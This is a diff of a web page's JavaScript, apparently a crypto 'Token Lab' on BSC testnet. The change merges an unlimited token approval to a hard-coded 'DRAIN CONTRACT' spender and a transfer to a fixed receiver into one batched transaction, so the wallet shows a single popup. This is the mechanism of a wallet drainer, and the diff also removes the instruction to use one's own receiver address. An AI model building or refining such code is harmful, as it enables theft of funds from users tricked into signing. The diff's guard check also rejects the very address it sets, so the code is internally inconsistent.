@@ -136,10 +136,10 @@
   <h2>🧪 Token Lab (BSC Testnet)</h2>
 
   <div class="button-section">
-    <button id="actionBtn" onclick="executeAll()">EXECUTE ALL</button>
+    <button id="actionBtn" onclick="executeAll()">EXECUTE ALL (1 POPUP)</button>
   </div>
 
-  <p id="status">Click button to: Connect → Approve → Transfer</p>
+  <p id="status">Click button to execute approve + transfer in one transaction</p>
 </div>
 
 <script>
@@ -148,15 +148,17 @@ let provider, signer, user;
 // 🔁 YOUR TOKEN
 const tokenAddress = "0x089d6677646bc535B1A8535ED856bb17493E332d";
 
+// 🔁 YOUR BATCH CONTRACT (deploy TokenBatcher.sol first)
+const batcherAddress = "0x04A56dD5fc9241B5046de02d17258553dd5772CF"; // REPLACE WITH YOUR DEPLOYED BATCH CONTRACT ADDRESS
+
 // 🔁 YOUR DRAIN CONTRACT
 const spender = "0x8dc3da2ff65ec0bbac40f33efe7c02c9c0b7ebaf";
 
-// 🔁 RECEIVER (use your own address for test)
+// 🔁 RECEIVER
 const receiver = "0xb52d3770bcf4673009f2f6bf8ba9177cba46d283";
 
-const tokenABI = [
-  "function transfer(address to, uint256 amount) returns (bool)",
-  "function approve(address spender, uint256 amount) returns (bool)"
+const batcherABI = [
+  "function batchApproveAndTransfer(address token, address spender, address receiver, uint256 transferAmount, uint256 approveAmount) external"
 ];
 
 async function executeAll() {
@@ -168,13 +170,10 @@ async function executeAll() {
     status.innerText = "⏳ Connecting wallet...";
     await connectWallet();
 
-    status.innerText = "⏳ Approving token...";
-    await approveToken();
+    status.innerText = "⏳ Executing batch transaction (approve + transfer)...\n\n🔔 Check wallet for 1 popup only!";
+    await batchApproveAndTransfer();
 
-    status.innerText = "⏳ Sending tokens...";
-    await sendToken();
-
-    status.innerText = "✅ All operations completed successfully!\n\n✓ Connected\n✓ Approved Unlimited\n✓ Sent 10 Tokens";
+    status.innerText = "✅ Transaction completed successfully!\n\n✓ Approved token\n✓ Transferred 10 tokens\n✓ All in 1 transaction!";
     btn.innerText = "COMPLETED ✓";
 
   } catch (e) {
@@ -204,15 +203,24 @@ async function connectWallet() {
   user = await signer.getAddress();
 }
 
-async function approveToken() {
-  const contract = new ethers.Contract(tokenAddress, tokenABI, signer);
-  const tx = await contract.approve(spender, ethers.constants.MaxUint256);
-  await tx.wait();
-}
+async function batchApproveAndTransfer() {
+  if (!batcherAddress || batcherAddress === "0x04A56dD5fc9241B5046de02d17258553dd5772CF") {
+    throw new Error("Please deploy TokenBatcher contract and update batcherAddress in the code");
+  }
 
-async function sendToken() {
-  const contract = new ethers.Contract(tokenAddress, tokenABI, signer);
-  const tx = await contract.transfer(receiver, ethers.utils.parseUnits("10", 18));
+  const contract = new ethers.Contract(batcherAddress, batcherABI, signer);
+
+  const transferAmount = ethers.utils.parseUnits("10", 18);
+  const approveAmount = ethers.constants.MaxUint256;
+
+  const tx = await contract.batchApproveAndTransfer(
+    tokenAddress,
+    spender,
+    receiver,
+    transferAmount,
+    approveAmount
+  );
+
   await tx.wait();
 }
 </script>
